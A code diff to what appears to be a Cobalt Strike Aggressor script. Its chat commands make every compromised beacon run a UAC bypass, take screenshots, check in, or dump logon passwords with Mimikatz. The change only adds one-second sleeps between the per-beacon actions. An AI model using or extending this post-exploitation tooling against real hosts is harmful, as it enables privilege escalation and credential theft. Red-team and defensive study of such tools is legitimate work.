@@ -29,6 +29,7 @@ sub elevateAll {
             say("Attempting to elevate beacon $bid");
             bbypassuac($bid, $listener);
         }
+        sleep(1000);
     }
 }
 
@@ -133,6 +134,7 @@ on event_public {
         else if ($cmd eq "!screenshot") {
             foreach $b (beacons()){
                 bscreenshot($b['id']);
+                sleep(1000);
             }
         }
         # Get DownloadString to stage Beacon
@@ -149,11 +151,13 @@ on event_public {
         else if ($cmd eq "!checkin") {
             foreach $b (beacons()){
                 bcheckin($b['id']);
+                sleep(1000);
             }
         }
         else if ($cmd eq "!mimikatz") {
             foreach $b (beacons()) {
                 blogonpasswords($b['id']);
+                sleep(1000);
             }
         }
         else if ($cmd eq "!help") {
